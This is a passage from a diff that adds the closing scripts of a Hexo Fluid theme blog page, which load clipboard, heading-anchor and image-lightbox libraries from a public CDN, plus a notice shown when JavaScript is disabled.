+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
